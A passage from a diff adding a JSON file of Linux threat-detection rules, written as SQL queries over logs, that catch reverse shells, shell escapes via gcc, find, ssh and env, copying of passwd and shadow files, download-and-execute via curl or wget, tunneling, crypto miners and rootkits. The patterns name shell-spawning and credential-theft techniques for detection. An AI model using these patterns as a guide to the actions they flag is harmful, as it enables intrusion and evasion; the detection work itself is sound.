+            "SELECT * FROM logs WHERE User='root' AND LogonId=0 AND CurrentDirectory='/var/opt/microsoft/scx/tmp' AND CommandLine LIKE '%/etc/opt/microsoft/scx/conf/tmpdir/scx%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Capsh Shell Invocation - Linux",
+        "id": "db1ac3be-f606-4e3a-89e0-9607cbe6b98a",
+        "status": "test",
+        "description": "Detects the use of the \"capsh\" utility to invoke a shell.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/capsh' ESCAPE '\\' AND CommandLine LIKE '% --' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Copy Passwd Or Shadow From TMP Path",
+        "id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+        "status": "test",
+        "description": "Detects when the file \"passwd\" or \"shadow\" is copied from tmp path",
+        "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+        "tags": [
+            "attack.credential-access",
+            "attack.t1552.001"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/cp' ESCAPE '\\' AND CommandLine LIKE '%/tmp/%' ESCAPE '\\' AND (CommandLine LIKE '%passwd%' ESCAPE '\\' OR CommandLine LIKE '%shadow%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution GCC  - Linux",
+        "id": "9b5de532-a757-4d70-946c-1f3e44f48b4d",
+        "status": "test",
+        "description": "Detects the use of the \"gcc\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.discovery",
+            "attack.t1083"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((Image LIKE '%/c89' ESCAPE '\\' OR Image LIKE '%/c99' ESCAPE '\\' OR Image LIKE '%/gcc' ESCAPE '\\') AND CommandLine LIKE '%-wrapper%' ESCAPE '\\') AND (CommandLine LIKE '%/bin/bash,-s%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash,-s%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish,-s%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh,-s%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh,-s%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Potential Perl Reverse Shell Execution",
+        "id": "259df6bc-003f-4306-9f54-4ff1a08fa38e",
+        "status": "test",
+        "description": "Detects execution of the perl binary with the \"-e\" flag and common strings related to potential reverse shell activity",
+        "author": "@d4ns4n_, Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.execution"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/perl' ESCAPE '\\' AND CommandLine LIKE '% -e %' ESCAPE '\\') AND ((CommandLine LIKE '%fdopen(%' ESCAPE '\\' AND CommandLine LIKE '%::Socket::INET%' ESCAPE '\\') OR (CommandLine LIKE '%Socket%' ESCAPE '\\' AND CommandLine LIKE '%connect%' ESCAPE '\\' AND CommandLine LIKE '%open%' ESCAPE '\\' AND CommandLine LIKE '%exec%' ESCAPE '\\'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Invocation of Shell via Rsync",
+        "id": "297241f3-8108-4b3a-8c15-2dda9f844594",
+        "status": "experimental",
+        "description": "Detects the execution of a shell as sub process of \"rsync\" without the expected command line flag \"-e\" being used, which could be an indication of exploitation as described in CVE-2024-12084. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.\n",
+        "author": "Florian Roth",
+        "tags": [
+            "attack.execution",
+            "attack.t1059",
+            "attack.t1203"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((ParentImage LIKE '%/rsync' ESCAPE '\\' OR ParentImage LIKE '%/rsyncd' ESCAPE '\\') AND (Image LIKE '%/ash' ESCAPE '\\' OR Image LIKE '%/bash' ESCAPE '\\' OR Image LIKE '%/csh' ESCAPE '\\' OR Image LIKE '%/dash' ESCAPE '\\' OR Image LIKE '%/ksh' ESCAPE '\\' OR Image LIKE '%/sh' ESCAPE '\\' OR Image LIKE '%/tcsh' ESCAPE '\\' OR Image LIKE '%/zsh' ESCAPE '\\')) AND (NOT CommandLine LIKE '% -e %' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Recon Indicators",
+        "id": "0cf7a157-8879-41a2-8f55-388dd23746b7",
+        "status": "test",
+        "description": "Detects events with patterns found in commands used for reconnaissance on linux systems",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.reconnaissance",
+            "attack.t1592.004",
+            "attack.credential-access",
+            "attack.t1552.001"
+        ],
+        "falsepositives": [
+            "Legitimate administration activities"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE CommandLine LIKE '% -name .htpasswd%' ESCAPE '\\' OR CommandLine LIKE '% -perm -4000 %' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Invocation via Env Command - Linux",
+        "id": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+        "status": "test",
+        "description": "Detects the use of the env command to invoke a shell. This may indicate an attempt to bypass restricted environments, escalate privileges, or execute arbitrary commands.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Github operations such as ghe-backup"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/env' ESCAPE '\\' AND (CommandLine LIKE '%/bin/bash' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Crypto Mining Indicators",
+        "id": "9069ea3c-b213-4c52-be13-86506a227ab1",
+        "status": "test",
+        "description": "Detects command line parameters or strings often used by crypto miners",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.impact",
+            "attack.t1496"
+        ],
+        "falsepositives": [
+            "Legitimate use of crypto miners"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE CommandLine LIKE '% --cpu-priority=%' ESCAPE '\\' OR CommandLine LIKE '%--donate-level=0%' ESCAPE '\\' OR CommandLine LIKE '% -o pool.%' ESCAPE '\\' OR CommandLine LIKE '% --nicehash%' ESCAPE '\\' OR CommandLine LIKE '% --algo=rx/0 %' ESCAPE '\\' OR CommandLine LIKE '%stratum+tcp://%' ESCAPE '\\' OR CommandLine LIKE '%stratum+udp://%' ESCAPE '\\' OR CommandLine LIKE '%sh -c /sbin/modprobe msr allow\\_writes=on%' ESCAPE '\\' OR CommandLine LIKE '%LS1kb25hdGUtbGV2ZWw9%' ESCAPE '\\' OR CommandLine LIKE '%0tZG9uYXRlLWxldmVsP%' ESCAPE '\\' OR CommandLine LIKE '%tLWRvbmF0ZS1sZXZlbD%' ESCAPE '\\' OR CommandLine LIKE '%c3RyYXR1bSt0Y3A6Ly%' ESCAPE '\\' OR CommandLine LIKE '%N0cmF0dW0rdGNwOi8v%' ESCAPE '\\' OR CommandLine LIKE '%zdHJhdHVtK3RjcDovL%' ESCAPE '\\' OR CommandLine LIKE '%c3RyYXR1bSt1ZHA6Ly%' ESCAPE '\\' OR CommandLine LIKE '%N0cmF0dW0rdWRwOi8v%' ESCAPE '\\' OR CommandLine LIKE '%zdHJhdHVtK3VkcDovL%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Inline Python Execution - Spawn Shell Via OS System Library",
+        "id": "2d2f44ff-4611-4778-a8fc-323a0e9850cc",
+        "status": "test",
+        "description": "Detects execution of inline Python code via the \"-c\" in order to call the \"system\" function from the \"os\" library, and spawn a shell.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE ((Image LIKE '%/python' ESCAPE '\\' OR Image LIKE '%/python2' ESCAPE '\\' OR Image LIKE '%/python3' ESCAPE '\\') OR (Image LIKE '%/python2.%' ESCAPE '\\' OR Image LIKE '%/python3.%' ESCAPE '\\')) AND ((CommandLine LIKE '% -c %' ESCAPE '\\' AND CommandLine LIKE '%os.system(%' ESCAPE '\\') AND (CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Invocation Via Ssh - Linux",
+        "id": "8737b7f6-8df3-4bb7-b1da-06019b99b687",
+        "status": "test",
+        "description": "Detects the use of the \"ssh\" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/ssh' ESCAPE '\\' AND (CommandLine LIKE '%ProxyCommand=;%' ESCAPE '\\' OR CommandLine LIKE '%permitlocalcommand=yes%' ESCAPE '\\' OR CommandLine LIKE '%localhost%' ESCAPE '\\')) AND (CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\' OR CommandLine LIKE '%sh 0<&2 1>&2%' ESCAPE '\\' OR CommandLine LIKE '%sh 1>&2 0<&2%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "OMIGOD SCX RunAsProvider ExecuteShellCommand",
+        "id": "21541900-27a9-4454-9c4c-3f0a4240344a",
+        "status": "test",
+        "description": "Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.\nSCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
+        "author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.initial-access",
+            "attack.execution",
+            "attack.t1068",
+            "attack.t1190",
+            "attack.t1203"
+        ],
+        "falsepositives": [
+            "Legitimate use of SCX RunAsProvider Invoke_ExecuteShellCommand."
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE User='root' AND LogonId=0 AND CurrentDirectory='/var/opt/microsoft/scx/tmp' AND CommandLine LIKE '%/bin/sh%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Download and Execute Pattern via Curl/Wget",
+        "id": "a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa",
+        "status": "experimental",
+        "description": "Detects suspicious use of command-line tools such as curl or wget to download remote\ncontent - particularly scripts - into temporary directories (e.g., /dev/shm, /tmp), followed by\nimmediate execution, indicating potential malicious activity. This pattern is commonly used\nby malicious scripts, stagers, or downloaders in fileless or multi-stage Linux attacks.\n",
+        "author": "Aayush Gupta",
+        "tags": [
+            "attack.execution",
+            "attack.t1059.004",
+            "attack.t1203"
+        ],
+        "falsepositives": [
+            "System update scripts using temporary files",
+            "Installer scripts or automated provisioning tools"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (CommandLine LIKE '%/curl%' ESCAPE '\\' OR CommandLine LIKE '%/wget%' ESCAPE '\\') AND (CommandLine LIKE '%/tmp/%' ESCAPE '\\' OR CommandLine LIKE '%/dev/shm/%' ESCAPE '\\') AND CommandLine LIKE '%sh -c%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Shell Execution via Find - Linux",
+        "id": "6adfbf8f-52be-4444-9bac-81b539624146",
+        "status": "test",
+        "description": "Detects the use of the find command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or exploitation attempt.\n",
+        "author": "Li Ling, Andy Parkidomo, Robert Rakowski, Blake Hartstein (Bloomberg L.P.)",
+        "tags": [
+            "attack.discovery",
+            "attack.t1083"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Image LIKE '%/find' ESCAPE '\\' AND (CommandLine LIKE '% . %' ESCAPE '\\' AND CommandLine LIKE '%-exec%' ESCAPE '\\')) AND (CommandLine LIKE '%/bin/bash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/dash%' ESCAPE '\\' OR CommandLine LIKE '%/bin/fish%' ESCAPE '\\' OR CommandLine LIKE '%/bin/sh%' ESCAPE '\\' OR CommandLine LIKE '%/bin/zsh%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Potential GobRAT File Discovery Via Grep",
+        "id": "e34cfa0c-0a50-4210-9cb3-5632d08eb041",
+        "status": "test",
+        "description": "Detects the use of grep to discover specific files created by the GobRAT malware",
+        "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+        "tags": [
+            "attack.discovery",
+            "attack.t1082"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/grep' ESCAPE '\\' AND (CommandLine LIKE '%apached%' ESCAPE '\\' OR CommandLine LIKE '%frpc%' ESCAPE '\\' OR CommandLine LIKE '%sshd.sh%' ESCAPE '\\' OR CommandLine LIKE '%zone.arm%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Communication To Ngrok Tunneling Service - Linux",
+        "id": "19bf6fdb-7721-4f3d-867f-53467f6a5db6",
+        "status": "test",
+        "description": "Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.exfiltration",
+            "attack.command-and-control",
+            "attack.t1567",
+            "attack.t1568.002",
+            "attack.t1572",
+            "attack.t1090",
+            "attack.t1102",
+            "attack.s0508"
+        ],
+        "falsepositives": [
+            "Legitimate use of ngrok"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE DestinationHostname LIKE '%tunnel.us.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.eu.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.ap.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.au.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.sa.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.jp.ngrok.com%' ESCAPE '\\' OR DestinationHostname LIKE '%tunnel.in.ngrok.com%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Potentially Suspicious Malware Callback Communication - Linux",
+        "id": "dbfc7c98-04ab-4ab7-aa94-c74d22aa7376",
+        "status": "test",
+        "description": "Detects programs that connect to known malware callback ports based on threat intelligence reports.\n",
+        "author": "hasselj",
+        "tags": [
+            "attack.persistence",
+            "attack.command-and-control",
+            "attack.t1571"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (Initiated='true' AND (DestinationPort=888 OR DestinationPort=999 OR DestinationPort=2200 OR DestinationPort=2222 OR DestinationPort=4000 OR DestinationPort=4444 OR DestinationPort=6789 OR DestinationPort=8531 OR DestinationPort=50501 OR DestinationPort=51820)) AND (NOT (DestinationIp LIKE '127.%' ESCAPE '\\' OR DestinationIp LIKE '10.%' ESCAPE '\\' OR DestinationIp LIKE '172.16.%' ESCAPE '\\' OR DestinationIp LIKE '172.17.%' ESCAPE '\\' OR DestinationIp LIKE '172.18.%' ESCAPE '\\' OR DestinationIp LIKE '172.19.%' ESCAPE '\\' OR DestinationIp LIKE '172.20.%' ESCAPE '\\' OR DestinationIp LIKE '172.21.%' ESCAPE '\\' OR DestinationIp LIKE '172.22.%' ESCAPE '\\' OR DestinationIp LIKE '172.23.%' ESCAPE '\\' OR DestinationIp LIKE '172.24.%' ESCAPE '\\' OR DestinationIp LIKE '172.25.%' ESCAPE '\\' OR DestinationIp LIKE '172.26.%' ESCAPE '\\' OR DestinationIp LIKE '172.27.%' ESCAPE '\\' OR DestinationIp LIKE '172.28.%' ESCAPE '\\' OR DestinationIp LIKE '172.29.%' ESCAPE '\\' OR DestinationIp LIKE '172.30.%' ESCAPE '\\' OR DestinationIp LIKE '172.31.%' ESCAPE '\\' OR DestinationIp LIKE '192.168.%' ESCAPE '\\' OR DestinationIp LIKE '169.254.%' ESCAPE '\\' OR DestinationIp='::1/128' OR DestinationIp LIKE 'fe8%' ESCAPE '\\' OR DestinationIp LIKE 'fe9%' ESCAPE '\\' OR DestinationIp LIKE 'fea%' ESCAPE '\\' OR DestinationIp LIKE 'feb%' ESCAPE '\\' OR DestinationIp LIKE 'fc%' ESCAPE '\\' OR DestinationIp LIKE 'fd%' ESCAPE '\\'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Communication To LocaltoNet Tunneling Service Initiated - Linux",
+        "id": "c4568f5d-131f-4e78-83d4-45b2da0ec4f1",
+        "status": "test",
+        "description": "Detects an executable initiating a network connection to \"LocaltoNet\" tunneling sub-domains.\nLocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.\nAttackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.\n",
+        "author": "Andreas Braathen (mnemonic.io)",
+        "tags": [
+            "attack.command-and-control",
+            "attack.t1572",
+            "attack.t1090",
+            "attack.t1102"
+        ],
+        "falsepositives": [
+            "Legitimate use of the LocaltoNet service."
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (DestinationHostname LIKE '%.localto.net' ESCAPE '\\' OR DestinationHostname LIKE '%.localtonet.com' ESCAPE '\\') AND Initiated='true'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Crypto Mining Pool Connections",
+        "id": "a46c93b7-55ed-4d27-a41b-c259456c4746",
+        "status": "stable",
+        "description": "Detects process connections to a Monero crypto mining pool",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.impact",
+            "attack.t1496"
+        ],
+        "falsepositives": [
+            "Legitimate use of crypto miners"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE DestinationHostname='pool.minexmr.com' OR DestinationHostname='fr.minexmr.com' OR DestinationHostname='de.minexmr.com' OR DestinationHostname='sg.minexmr.com' OR DestinationHostname='ca.minexmr.com' OR DestinationHostname='us-west.minexmr.com' OR DestinationHostname='pool.supportxmr.com' OR DestinationHostname='mine.c3pool.com' OR DestinationHostname='xmr-eu1.nanopool.org' OR DestinationHostname='xmr-eu2.nanopool.org' OR DestinationHostname='xmr-us-east1.nanopool.org' OR DestinationHostname='xmr-us-west1.nanopool.org' OR DestinationHostname='xmr-asia1.nanopool.org' OR DestinationHostname='xmr-jp1.nanopool.org' OR DestinationHostname='xmr-au1.nanopool.org' OR DestinationHostname='xmr.2miners.com' OR DestinationHostname='xmr.hashcity.org' OR DestinationHostname='xmr.f2pool.com' OR DestinationHostname='xmrpool.eu' OR DestinationHostname='pool.hashvault.pro' OR DestinationHostname='moneroocean.stream' OR DestinationHostname='monerocean.stream'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "ASLR Disabled Via Sysctl or Direct Syscall - Linux",
+        "id": "e497a24e-9345-4a62-9803-b06d7d7cb132",
+        "status": "experimental",
+        "description": "Detects actions that disable Address Space Layout Randomization (ASLR) in Linux, including:\n  - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE flag (0x0040000)\n  - Modification of the /proc/sys/kernel/randomize_va_space file\n  - Execution of the `sysctl` command to set `kernel.randomize_va_space=0`\nDisabling ASLR is often used by attackers during exploit development or to bypass memory protection mechanisms.\nA successful use of these methods can reduce the effectiveness of ASLR and make memory corruption attacks more reliable.\n",
+        "author": "Milad Cheraghi",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.defense-evasion",
+            "attack.t1562.001",
+            "attack.t1055.009"
+        ],
+        "falsepositives": [
+            "Debugging or legitimate software testing"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (type='SYSCALL' AND SYSCALL='personality' AND a0=40000) OR (type='EXECVE' AND a0='sysctl' AND a1='-w' AND a2 LIKE 'kernel.randomize\\_va\\_space=0' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Keylogging with Pam.d",
+        "id": "49aae26c-450e-448b-911d-b3c13d178dfc",
+        "status": "test",
+        "description": "Detect attempt to enable auditing of TTY input",
+        "author": "Pawel Mazur",
+        "tags": [
+            "attack.collection",
+            "attack.credential-access",
+            "attack.t1003",
+            "attack.t1056.001"
+        ],
+        "falsepositives": [
+            "Administrative work"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE (type='PATH' AND (name='/etc/pam.d/system-auth' OR name='/etc/pam.d/password-auth')) OR (type='TTY' OR type LIKE 'USER\\_TTY' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Suspicious Filename with Embedded Base64 Commands",
+        "id": "179b3686-6271-4d87-807d-17d843a8af73",
+        "status": "experimental",
+        "description": "Detects files with specially crafted filenames that embed Base64-encoded bash payloads designed to execute when processed by shell scripts.\nThese filenames exploit shell interpretation quirks to trigger hidden commands, a technique observed in VShell malware campaigns.\n",
+        "author": "@kostastsale",
+        "tags": [
+            "attack.execution",
+            "attack.t1059.004",
+            "attack.defense-evasion",
+            "attack.t1027"
+        ],
+        "falsepositives": [
+            "Legitimate files with similar naming patterns (very unlikely)."
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE TargetFilename LIKE '%{echo%' ESCAPE '\\' OR TargetFilename LIKE '%{base64,-d}%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Triple Cross eBPF Rootkit Default LockFile",
+        "id": "c0239255-822c-4630-b7f1-35362bcb8f44",
+        "status": "test",
+        "description": "Detects the creation of the file \"rootlog\" which is used by the TripleCross rootkit as a way to check if the backdoor is already running.",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.defense-evasion"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE TargetFilename='/tmp/rootlog'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Triple Cross eBPF Rootkit Default Persistence",
+        "id": "1a2ea919-d11d-4d1e-8535-06cda13be20f",
+        "status": "test",
+        "description": "Detects the creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories. Which both are related to the TripleCross persistence method",
+        "author": "Nasreddine Bencherchali (Nextron Systems)",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.execution",
+            "attack.persistence",
+            "attack.defense-evasion",
+            "attack.t1053.003"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE TargetFilename LIKE '%ebpfbackdoor' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Disable System Firewall",
+        "id": "53059bc0-1472-438b-956a-7508a94a91f0",
+        "status": "test",
+        "description": "Detects disabling of system firewalls which could be used by adversaries to bypass controls that limit usage of the network.",
+        "author": "Pawel Mazur",
+        "tags": [
+            "attack.t1562.004",
+            "attack.defense-evasion"
+        ],
+        "falsepositives": [
+            "Admin activity"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type LIKE 'SERVICE\\_STOP' ESCAPE '\\' AND (unit='firewalld' OR unit='iptables' OR unit='ufw')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Auditing Configuration Changes on Linux Host",
+        "id": "977ef627-4539-4875-adf4-ed8f780c4922",
+        "status": "test",
+        "description": "Detect changes in auditd configuration files",
+        "author": "Mikhail Larin, oscd.community",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.t1562.006"
+        ],
+        "falsepositives": [
+            "Legitimate administrative activity"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type='PATH' AND (name LIKE '/etc/audit/%' ESCAPE '\\' OR name='/etc/libaudit.conf' OR name LIKE '/etc/audisp/%' ESCAPE '\\')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Logging Configuration Changes on Linux Host",
+        "id": "c830f15d-6f6e-430f-8074-6f73d6807841",
+        "status": "test",
+        "description": "Detect changes of syslog daemons configuration files",
+        "author": "Mikhail Larin, oscd.community",
+        "tags": [
+            "attack.defense-evasion",
+            "attack.t1562.006"
+        ],
+        "falsepositives": [
+            "Legitimate administrative activity"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type='PATH' AND (name='/etc/syslog.conf' OR name='/etc/rsyslog.conf' OR name='/etc/syslog-ng/syslog-ng.conf')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Modification of ld.so.preload",
+        "id": "4b3cb710-5e83-4715-8c45-8b2b5b3e5751",
+        "status": "test",
+        "description": "Identifies modification of ld.so.preload for shared object injection. This technique is used by attackers to load arbitrary code into processes.",
+        "author": "E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.persistence",
+            "attack.defense-evasion",
+            "attack.t1574.006"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type='PATH' AND name='/etc/ld.so.preload'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "BPFDoor Abnormal Process ID or Lock File Accessed",
+        "id": "808146b2-9332-4d78-9416-d7e47012d83d",
+        "status": "test",
+        "description": "detects BPFDoor .lock and .pid files access in temporary file storage facility",
+        "author": "Rafal Piasecki",
+        "tags": [
+            "attack.execution",
+            "attack.t1106",
+            "attack.t1059"
+        ],
+        "falsepositives": [
+            "Unlikely"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type='PATH' AND (name='/var/run/haldrund.pid' OR name='/var/run/xinetd.lock' OR name='/var/run/kdevrund.pid')"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Loading of Kernel Module via Insmod",
+        "id": "106d7cbd-80ff-4985-b682-a7043e5acb72",
+        "status": "test",
+        "description": "Detects loading of kernel modules with insmod command.\nLoadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.\nAdversaries may use LKMs to obtain persistence within the system or elevate the privileges.\n",
+        "author": "Pawel Mazur",
+        "tags": [
+            "attack.persistence",
+            "attack.privilege-escalation",
+            "attack.t1547.006"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "high",
+        "rule": [
+            "SELECT * FROM logs WHERE type='SYSCALL' AND comm='insmod' AND exe='/usr/bin/kmod'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Linux Reverse Shell Indicator",
+        "id": "83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871",
+        "status": "test",
